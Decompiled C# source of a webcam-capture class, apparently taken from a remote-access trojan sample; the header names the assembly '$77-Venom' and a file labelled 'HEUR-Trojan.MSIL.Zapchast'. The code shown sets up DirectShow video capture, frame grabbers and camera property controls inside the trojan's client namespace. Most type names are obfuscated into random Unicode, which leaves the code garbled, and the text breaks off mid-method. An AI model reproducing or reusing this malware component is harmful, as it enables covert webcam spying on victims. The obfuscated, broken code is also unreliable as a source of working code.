// Decompiled with JetBrains decompiler
// Type: xClient.Core.AForge.Video.DirectShow.VideoCaptureDevice
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.AForge.Video.DirectShow.Internals;

namespace xClient.Core.AForge.Video.DirectShow
{
  public class VideoCaptureDevice : 쿒\uF588\u2FCD븫\uED3C\uF5D3ӛ\uFFFD\uA700쓠礽腁\u215FⰫ뽿ꡨ렊ꢍܬ锏
  {
    private string deviceMoniker;
    private int framesReceived;
    private long bytesReceived;
    private 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ videoResolution;
    private 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ snapshotResolution;
    private bool provideSnapshots;
    private Thread thread;
    private ManualResetEvent stopEvent;
    private 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[] videoCapabilities;
    private 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[] snapshotCapabilities;
    private bool needToSetVideoInput;
    private bool needToSimulateTrigger;
    private bool needToDisplayPropertyPage;
    private bool needToDisplayCrossBarPropertyPage;
    private IntPtr parentWindowForPropertyPage = IntPtr.Zero;
    private object sourceObject;
    private DateTime startTime;
    private object sync = new object();
    private bool? isCrossbarAvailable;
    private 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[] crossbarVideoInputs;
    private 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀 crossbarVideoInput = 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀.Default;
    private static Dictionary<string, 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[]> cacheVideoCapabilities = new Dictionary<string, 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[]>();
    private static Dictionary<string, 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[]> cacheSnapshotCapabilities = new Dictionary<string, 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[]>();
    private static Dictionary<string, 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[]> cacheCrossbarVideoInputs = new Dictionary<string, 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[]>();

    public 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀 CrossbarVideoInput
    {
      get => this.crossbarVideoInput;
      set
      {
        this.needToSetVideoInput = true;
        this.crossbarVideoInput = value;
      }
    }

    public 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[] AvailableCrossbarVideoInputs
    {
      get
      {
        if (this.crossbarVideoInputs == null)
        {
          lock (VideoCaptureDevice.cacheCrossbarVideoInputs)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheCrossbarVideoInputs.ContainsKey(this.deviceMoniker))
                this.crossbarVideoInputs = VideoCaptureDevice.cacheCrossbarVideoInputs[this.deviceMoniker];
            }
          }
          if (this.crossbarVideoInputs == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.crossbarVideoInputs == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.crossbarVideoInputs == null ? new 㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[0] : this.crossbarVideoInputs;
      }
    }

    public bool ProvideSnapshots
    {
      get => this.provideSnapshots;
      set => this.provideSnapshots = value;
    }

    public event 昧ᩩ㵵끧\u1CA7\uEC6B榽ػ쌶锎驂\u24E6\u0A50흢큙寤ಭ\u241C䶜烄 NewFrame;

    public event 昧ᩩ㵵끧\u1CA7\uEC6B榽ػ쌶锎驂\u24E6\u0A50흢큙寤ಭ\u241C䶜烄 SnapshotFrame;

    public event \uF2B3뻼㵈䀭Ӻ欛酆㠠㐶빠퇭붇㫰伜헧我᥌쾞쫆\uE24C VideoSourceError;

    public event \u2211䖩\u2256糟\u2E81\u3194\uFFFD\u007B铜셛網ꏘ䌀ꖫី᳔Ą犏㦍絘 PlayingFinished;

    public virtual string Source
    {
      get => this.deviceMoniker;
      set
      {
        this.deviceMoniker = value;
        this.videoCapabilities = (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[]) null;
        this.snapshotCapabilities = (避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[]) null;
        this.crossbarVideoInputs = (㮽윛橵됒谋䰨뎿篪끮챌扵勵\uFFFD겄䋂鬥㾛ꉄ嫾텀[]) null;
        this.isCrossbarAvailable = new bool?();
      }
    }

    public int FramesReceived
    {
      get
      {
        int framesReceived = this.framesReceived;
        this.framesReceived = 0;
        return framesReceived;
      }
    }

    public long BytesReceived
    {
      get
      {
        long bytesReceived = this.bytesReceived;
        this.bytesReceived = 0L;
        return bytesReceived;
      }
    }

    public bool IsRunning
    {
      get
      {
        if (this.thread != null)
        {
          if (!this.thread.Join(0))
            return true;
          this.Free();
        }
        return false;
      }
    }

    [Obsolete]
    public Size DesiredFrameSize
    {
      get => Size.Empty;
      set
      {
      }
    }

    [Obsolete]
    public Size DesiredSnapshotSize
    {
      get => Size.Empty;
      set
      {
      }
    }

    [Obsolete]
    public int DesiredFrameRate
    {
      get => 0;
      set
      {
      }
    }

    public 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ VideoResolution
    {
      get => this.videoResolution;
      set => this.videoResolution = value;
    }

    public 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ SnapshotResolution
    {
      get => this.snapshotResolution;
      set => this.snapshotResolution = value;
    }

    public 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[] VideoCapabilities
    {
      get
      {
        if (this.videoCapabilities == null)
        {
          lock (VideoCaptureDevice.cacheVideoCapabilities)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheVideoCapabilities.ContainsKey(this.deviceMoniker))
                this.videoCapabilities = VideoCaptureDevice.cacheVideoCapabilities[this.deviceMoniker];
            }
          }
          if (this.videoCapabilities == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.videoCapabilities == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.videoCapabilities == null ? new 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[0] : this.videoCapabilities;
      }
    }

    public 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[] SnapshotCapabilities
    {
      get
      {
        if (this.snapshotCapabilities == null)
        {
          lock (VideoCaptureDevice.cacheSnapshotCapabilities)
          {
            if (!string.IsNullOrEmpty(this.deviceMoniker))
            {
              if (VideoCaptureDevice.cacheSnapshotCapabilities.ContainsKey(this.deviceMoniker))
                this.snapshotCapabilities = VideoCaptureDevice.cacheSnapshotCapabilities[this.deviceMoniker];
            }
          }
          if (this.snapshotCapabilities == null)
          {
            if (!this.IsRunning)
            {
              this.WorkerThread(false);
            }
            else
            {
              for (int index = 0; index < 500 && this.snapshotCapabilities == null; ++index)
                Thread.Sleep(10);
            }
          }
        }
        return this.snapshotCapabilities == null ? new 避蘌㸛蚌\uF08F无㓼㻅Ȝ巻\u193Dߋ엸嬸樒떏絗檿冒ΐ[0] : this.snapshotCapabilities;
      }
    }

    public object SourceObject => this.sourceObject;

    public VideoCaptureDevice()
    {
    }

    public VideoCaptureDevice(string deviceMoniker) => this.deviceMoniker = deviceMoniker;

    public void Start()
    {
      if (this.IsRunning)
        return;
      if (string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      this.framesReceived = 0;
      this.bytesReceived = 0L;
      this.isCrossbarAvailable = new bool?();
      this.needToSetVideoInput = true;
      this.stopEvent = new ManualResetEvent(false);
      lock (this.sync)
      {
        this.thread = new Thread(new ThreadStart(this.WorkerThread));
        this.thread.Name = this.deviceMoniker;
        this.thread.Start();
      }
    }

    public void SignalToStop()
    {
      if (this.thread == null)
        return;
      this.stopEvent.Set();
    }

    public void WaitForStop()
    {
      if (this.thread == null)
        return;
      this.thread.Join();
      this.Free();
    }

    public void Stop()
    {
      if (!this.IsRunning)
        return;
      this.thread.Abort();
      this.WaitForStop();
    }

    private void Free()
    {
      this.thread = (Thread) null;
      this.stopEvent.Close();
      this.stopEvent = (ManualResetEvent) null;
    }

    public void DisplayPropertyPage(IntPtr parentWindow)
    {
      if (this.deviceMoniker == null || this.deviceMoniker == string.Empty)
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        if (this.IsRunning)
        {
          this.parentWindowForPropertyPage = parentWindow;
          this.needToDisplayPropertyPage = true;
        }
        else
        {
          object filter;
          try
          {
            filter = FilterInfo.CreateFilter(this.deviceMoniker);
          }
          catch
          {
            throw new ApplicationException("Failed creating device object for moniker.");
          }
          if (!(filter is 욘ꓖ鑳ᓠꪶ皬娓㠹\u2401搣㗯졈\u2ED8瘴\uE1F7뚴ꤵ縩㝸ℱ))
            throw new NotSupportedException("The video source does not support configuration property page.");
          this.DisplayPropertyPage(parentWindow, filter);
          Marshal.ReleaseComObject(filter);
        }
      }
    }

    public void DisplayCrossbarPropertyPage(IntPtr parentWindow)
    {
      lock (this.sync)
      {
        for (int index = 0; index < 500 && !this.isCrossbarAvailable.HasValue && this.IsRunning; ++index)
          Thread.Sleep(10);
        if (!this.IsRunning || !this.isCrossbarAvailable.HasValue)
          throw new ApplicationException("The video source must be running in order to display crossbar property page.");
        if (!this.isCrossbarAvailable.Value)
          throw new NotSupportedException("Crossbar configuration is not supported by currently running video source.");
        this.parentWindowForPropertyPage = parentWindow;
        this.needToDisplayCrossBarPropertyPage = true;
      }
    }

    public bool CheckIfCrossbarAvailable()
    {
      lock (this.sync)
      {
        if (!this.isCrossbarAvailable.HasValue)
        {
          if (!this.IsRunning)
          {
            this.WorkerThread(false);
          }
          else
          {
            for (int index = 0; index < 500 && !this.isCrossbarAvailable.HasValue; ++index)
              Thread.Sleep(10);
          }
        }
        return this.isCrossbarAvailable.HasValue && this.isCrossbarAvailable.Value;
      }
    }

    public void SimulateTrigger() => this.needToSimulateTrigger = true;

    public bool SetCameraProperty(
      \uFFFDጫ鯥篔搏稕ꀜ\uF00F垱놄ꦲ\uE95A\uE47A叵\uE8C3\uE7C1ઠ\u17FC釉踅 property,
      int value,
      卯퇩\u2B99㳱明\uF05E减懍ⵢ㱁༷鱯㓓笺љℯꥯ뇏䕸\uE1E2 controlFlags)
    {
      bool flag = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 軎ᵭﱱ䗴嵑̂꿎慄蔭\uFFFD\uE1C1俆樫\u1CAC稅䐌\uF608ꅱ굝\u324C))
          throw new NotSupportedException("The video source does not support camera control.");
        flag = ((軎ᵭﱱ䗴嵑̂꿎慄蔭\uFFFD\uE1C1俆樫\u1CAC稅䐌\uF608ꅱ굝\u324C) filter).Set(property, value, controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return flag;
    }

    public bool GetCameraProperty(
      \uFFFDጫ鯥篔搏稕ꀜ\uF00F垱놄ꦲ\uE95A\uE47A叵\uE8C3\uE7C1ઠ\u17FC釉踅 property,
      out int value,
      out 卯퇩\u2B99㳱明\uF05E减懍ⵢ㱁༷鱯㓓笺љℯꥯ뇏䕸\uE1E2 controlFlags)
    {
      bool cameraProperty = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 軎ᵭﱱ䗴嵑̂꿎慄蔭\uFFFD\uE1C1俆樫\u1CAC稅䐌\uF608ꅱ굝\u324C))
          throw new NotSupportedException("The video source does not support camera control.");
        cameraProperty = ((軎ᵭﱱ䗴嵑̂꿎慄蔭\uFFFD\uE1C1俆樫\u1CAC稅䐌\uF608ꅱ굝\u324C) filter).Get(property, out value, out controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return cameraProperty;
    }

    public bool GetCameraPropertyRange(
      \uFFFDጫ鯥篔搏稕ꀜ\uF00F垱놄ꦲ\uE95A\uE47A叵\uE8C3\uE7C1ઠ\u17FC釉踅 property,
      out int minValue,
      out int maxValue,
      out int stepSize,
      out int defaultValue,
      out 卯퇩\u2B99㳱明\uF05E减懍ⵢ㱁༷鱯㓓笺љℯꥯ뇏䕸\uE1E2 controlFlags)
    {
      bool cameraPropertyRange = true;
      if (this.deviceMoniker == null || string.IsNullOrEmpty(this.deviceMoniker))
        throw new ArgumentException("Video source is not specified.");
      lock (this.sync)
      {
        object filter;
        try
        {
          filter = FilterInfo.CreateFilter(this.deviceMoniker);
        }
        catch
        {
          throw new ApplicationException("Failed creating device object for moniker.");
        }
        if (!(filter is 軎ᵭﱱ䗴嵑̂꿎慄蔭\uFFFD\uE1C1俆樫\u1CAC稅䐌\uF608ꅱ굝\u324C))
          throw new NotSupportedException("The video source does not support camera control.");
        cameraPropertyRange = ((軎ᵭﱱ䗴嵑̂꿎慄蔭\uFFFD\uE1C1俆樫\u1CAC稅䐌\uF608ꅱ굝\u324C) filter).GetRange(property, out minValue, out maxValue, out stepSize, out defaultValue, out controlFlags) >= 0;
        Marshal.ReleaseComObject(filter);
      }
      return cameraPropertyRange;
    }

    private void WorkerThread() => this.WorkerThread(true);

    private void WorkerThread(bool runGraph)
    {
      퓈\u0D49襒\u24A9ୈ쐷姄䅬\uFFFD\u2874유\u1C8Fשּׂ聟靉\uEA44앚\u254D麘뺔 reason = 퓈\u0D49襒\u24A9ୈ쐷姄䅬\uFFFD\u2874유\u1C8Fשּׂ聟靉\uEA44앚\u254D麘뺔.쇛\uFFFD쁍\u257B䪴閱ྱ\uE13E띊흉\uFFFD屚萱\uE4F6\u20FE쐮Ⴖվ뼨ᕱ;
      bool flag = false;
      VideoCaptureDevice.Grabber callback1 = new VideoCaptureDevice.Grabber(this, false);
      VideoCaptureDevice.Grabber callback2 = new VideoCaptureDevice.Grabber(this, true);
      object o1 = (object) null;
      object o2 = (object) null;
      object o3 = (object) null;
      object o4 = (object) null;
      object retInterface = (object) null;
      깊ﾶ\u20B4婔ಛ\u237E\uEEA0쯕\uE7A0쑚㮣\uF51B\uEB59뤙鏝䲷䋋\u2EB8㦠\u21FF 깊ﾶ婔ಛ쯕쑚㮣뤙鏝䲷䋋㦠 = (깊ﾶ\u20B4婔ಛ\u237E\uEEA0쯕\uE7A0쑚㮣\uF51B\uEB59뤙鏝䲷䋋\u2EB8㦠\u21FF) null;
      \u1364쨽ﮙ\uEB1F鰡謹㩐\uF084풿氋ﴋᚬ䰚ﻳܙ惷얙\u0B65芺믧 쨽ﮙ鰡謹㩐풿氋ﴋᚬ䰚ﻳܙ惷얙芺믧 = (\u1364쨽ﮙ\uEB1F鰡謹㩐\uF084풿氋ﴋᚬ䰚ﻳܙ惷얙\u0B65芺믧) null;
      퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅1 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null;
      퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅2 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null;
      퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅3 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) null;
      \uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025 䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵1 = (\uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025) null;
      \uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025 䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵2 = (\uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025) null;
      浪\uEE87堪ܸ뙭ಃ鳸㷸節\u32B3湏\uECBD\uF33D\uE2EA\u24FF\uA7BF\u0F48䘷屜絤 浪堪ܸ뙭ಃ鳸㷸節湏䘷屜絤1 = (浪\uEE87堪ܸ뙭ಃ鳸㷸節\u32B3湏\uECBD\uF33D\uE2EA\u24FF\uA7BF\u0F48䘷屜絤) null;
      撷妅閙꣰ㅰ倆䯞\uF6E4䊽\u2BAFỎ杗悹硃煆\uE825판\uF8E9ͯㅐ 撷妅閙꣰ㅰ倆䯞䊽Ỏ杗悹硃煆판ͯㅐ = (撷妅閙꣰ㅰ倆䯞\uF6E4䊽\u2BAFỎ杗悹硃煆\uE825판\uF8E9ͯㅐ) null;
      \u2066ਲ癝윗췇ک\u087C\u26CB音涷歍쉔눶姉駀곍럚퍅\uE76Aວ obj1 = (\u2066ਲ癝윗췇ک\u087C\u26CB音涷歍쉔눶姉駀곍럚퍅\uE76Aວ) null;
      \u2108䨆쪨窜뉦\uE314函㱳邧홬㙴뵹\u2606쮄\uEE9C装턠ଫ팑珤 pin = (\u2108䨆쪨窜뉦\uE314函㱳邧홬㙴뵹\u2606쮄\uEE9C装턠ଫ팑珤) null;
      楋欏㲴䐧筕ņ駄\u1C89\uF224\uED1E춸֪\u20B8瑜娥\uF61Bꅴ\u32B7鍮㫫 楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫 = (楋欏㲴䐧筕ņ駄\u1C89\uF224\uED1E춸֪\u20B8瑜娥\uF61Bꅴ\u32B7鍮㫫) null;
      try
      {
        Type typeFromClsid1 = Type.GetTypeFromCLSID(晪뱳\uF68E\uEB03\uF290켣圦쩘줷竽쁧ɲ㫝胁ᘬ笇ឤ䡴숕\uEF20.㺈쮉\uF7BDŌ㧞虸㯻\uE77D\uFFFD螏峬\uEA88\uE335첉畧형멃곱釨\u27C7);
        o1 = !(typeFromClsid1 == (Type) null) ? Activator.CreateInstance(typeFromClsid1) : throw new ApplicationException("Failed creating capture graph builder");
        깊ﾶ\u20B4婔ಛ\u237E\uEEA0쯕\uE7A0쑚㮣\uF51B\uEB59뤙鏝䲷䋋\u2EB8㦠\u21FF graphBuilder1 = (깊ﾶ\u20B4婔ಛ\u237E\uEEA0쯕\uE7A0쑚㮣\uF51B\uEB59뤙鏝䲷䋋\u2EB8㦠\u21FF) o1;
        Type typeFromClsid2 = Type.GetTypeFromCLSID(晪뱳\uF68E\uEB03\uF290켣圦쩘줷竽쁧ɲ㫝胁ᘬ笇ឤ䡴숕\uEF20.㢎\uAA5D\u26D1枭\u2EDE쓶ְ\uF714\uA49C栜ቊ똢觙Ẅ丁崝\u2250\u32B6\u2929쵈);
        o2 = !(typeFromClsid2 == (Type) null) ? Activator.CreateInstance(typeFromClsid2) : throw new ApplicationException("Failed creating filter graph");
        \u1364쨽ﮙ\uEB1F鰡謹㩐\uF084풿氋ﴋᚬ䰚ﻳܙ惷얙\u0B65芺믧 graphBuilder2 = (\u1364쨽ﮙ\uEB1F鰡謹㩐\uF084풿氋ﴋᚬ䰚ﻳܙ惷얙\u0B65芺믧) o2;
        graphBuilder1.SetFiltergraph((屯犺鐹\u0F05壸\u1AD1Ƙ㻯䀃䴫朙쯐熞\u2052\u4DBF伅㦕箮悳妮) graphBuilder2);
        this.sourceObject = FilterInfo.CreateFilter(this.deviceMoniker);
        퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅4 = this.sourceObject != null ? (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) this.sourceObject : throw new ApplicationException("Failed creating device object for moniker");
        try
        {
          撷妅閙꣰ㅰ倆䯞䊽Ỏ杗悹硃煆판ͯㅐ = (撷妅閙꣰ㅰ倆䯞\uF6E4䊽\u2BAFỎ杗悹硃煆\uE825판\uF8E9ͯㅐ) this.sourceObject;
        }
        catch
        {
        }
        Type typeFromClsid3 = Type.GetTypeFromCLSID(晪뱳\uF68E\uEB03\uF290켣圦쩘줷竽쁧ɲ㫝胁ᘬ笇ឤ䡴숕\uEF20.鄭\uEAC1劇摤\uFFFDᑻ孝ᬧ믺\uF394쏔\u27EB壉邸ꦃ鰰ᛗ궈\uF3BB흕);
        o3 = !(typeFromClsid3 == (Type) null) ? Activator.CreateInstance(typeFromClsid3) : throw new ApplicationException("Failed creating sample grabber");
        \uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025 䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵3 = (\uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025) o3;
        퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅5 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) o3;
        o4 = Activator.CreateInstance(typeFromClsid3);
        \uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025 䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵4 = (\uF759䍔꿱ﭓ\uE5BF\u22F1襏䊢ᮃ媚拿䣵쁎\uFFFD輌颮诇\uF6EB덵\u2025) o4;
        퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅6 = (퍁暱\uFFFD灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅) o4;
        graphBuilder2.AddFilter(灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅4, "source");
        graphBuilder2.AddFilter(灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅5, "grabber_video");
        graphBuilder2.AddFilter(灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅6, "grabber_snapshot");
        AMMediaType mediaType = new AMMediaType();
        mediaType.MajorType = 懦쫐梗셑\uEAD1ꢉ疓쇜\u2A2E翊ᶧ쨭隉ꦒ\u266Aｾᕠ䊦諀쿲.뮤\u2BDE䤡鸵ꩍ\uFFFD槪韪\uF495瑇㙑\u2660村혃ѽ\uFFFD掦䧠敫쑽;
        mediaType.SubType = \u270F\uEE33\uE6F3ॆ\uED5E\u3347㔎\uFFFD뛔\uFFFD돲摦챬\u2D73縠\uA4C8阖沆\uEA09駩.缹숏ᵜ䂵諪\uFFFD\u0DBC\uF730略ջ餇ｿ\uFFFD툳\uFFFDꞈ⁯鬪磴\u2B7C;
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵3.SetMediaType(mediaType);
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵4.SetMediaType(mediaType);
        graphBuilder1.FindInterface(灀ꏅ勾麭鬜쌜ﱡ荸元晣扤ﴳᛛ䛲㹸\u28CF亹娯\uFFFDਫ਼.뙢迧瓍㜬\u0837\uE62D颬棡맷쳮\uFDFF陧Иꃷ\uFFFD됇ﲔꀍ噘\uFFFD, Guid.Empty, 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅4, typeof (楋欏㲴䐧筕ņ駄\u1C89\uF224\uED1E춸֪\u20B8瑜娥\uF61Bꅴ\u32B7鍮㫫).GUID, out retInterface);
        if (retInterface != null)
          楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫 = (楋欏㲴䐧筕ņ駄\u1C89\uF224\uED1E춸֪\u20B8瑜娥\uF61Bꅴ\u32B7鍮㫫) retInterface;
        this.isCrossbarAvailable = new bool?(楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫 != null);
        this.crossbarVideoInputs = this.ColletCrossbarVideoInputs(楋欏㲴䐧筕ņ駄춸֪瑜娥ꅴ鍮㫫);
        if (撷妅閙꣰ㅰ倆䯞䊽Ỏ杗悹硃煆판ͯㅐ != null)
        {
          graphBuilder1.FindPin(this.sourceObject, 鑅ዽ뙄\uF1E0렵杓显\uF2E0閛꾆녪ⶻ\u2449擦᪙䃗甼쩟锿团.㮕邃鰸ꈎ欰\uFFFD寵贯部얎邿뾖칮ꩃⴄ湙퀺슐觿졠, 㶽ɞ쾗舺\uF5C77詖\uE932ؤỘ䏳귁킁얤ᴘ塑艺ㅎ拞愛.쌈\u23A5鲺炵㒣ꇃ䀉\u3254芤\u1CAF흨硺䭨ồࠃ\u2327篜剴깕\uABFF, 懦쫐梗셑\uEAD1ꢉ疓쇜\u2A2E翊ᶧ쨭隉ꦒ\u266Aｾᕠ䊦諀쿲.뮤\u2BDE䤡鸵ꩍ\uFFFD槪韪\uF495瑇㙑\u2660村혃ѽ\uFFFD掦䧠敫쑽, false, 0, out pin);
          if (pin != null)
          {
            \uFFFD\uEEFE뼟ក\u0AF5Ϥ\uFFFD\u2A67螨秠沢\uE24B崨萿\uE637깾䈟Ǝ\uFFFD\u29BC flags;
            撷妅閙꣰ㅰ倆䯞䊽Ỏ杗悹硃煆판ͯㅐ.GetCaps(pin, out flags);
            flag = (flags & \uFFFD\uEEFE뼟ក\u0AF5Ϥ\uFFFD\u2A67螨秠沢\uE24B崨萿\uE637깾䈟Ǝ\uFFFD\u29BC.\uA4FF蟾襙쮛ꁊ䰴넲錼㛟\uFFFD䐿倣탈퇂\uEAF8펋밎ⵃ셯\u2376) != 0;
          }
        }
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵3.SetBufferSamples(false);
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵3.SetOneShot(false);
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵3.SetCallback((ၵ执\uF855릆增텰竻䪶\u28E8逇\uEF6A쳅湫ᎀ䭁횪넌滮퍍\u218A) callback1, 1);
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵4.SetBufferSamples(true);
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵4.SetOneShot(false);
        䍔꿱ﭓ襏䊢ᮃ媚拿䣵쁎輌颮诇덵4.SetCallback((ၵ执\uF855릆增텰竻䪶\u28E8逇\uEF6A쳅湫ᎀ䭁횪넌滮퍍\u218A) callback2, 1);
        this.GetPinCapabilitiesAndConfigureSizeAndRate(graphBuilder1, 灂ˌ狨ݦ娪怺읕隬鬿謁ᧀ蕂䒿鴚㩤蝫錅4, 㶽ɞ쾗舺\uF5C77詖\uE932ؤỘ䏳귁킁얤ᴘ塑艺ㅎ拞愛.䦝놌͒璼췣ŋ瀰춟圅扲\uED0B肓\uF751洓餙肫뮽烏\uFFFD畯, this.videoResolution, ref this.videoCapabilities);
        if (flag)
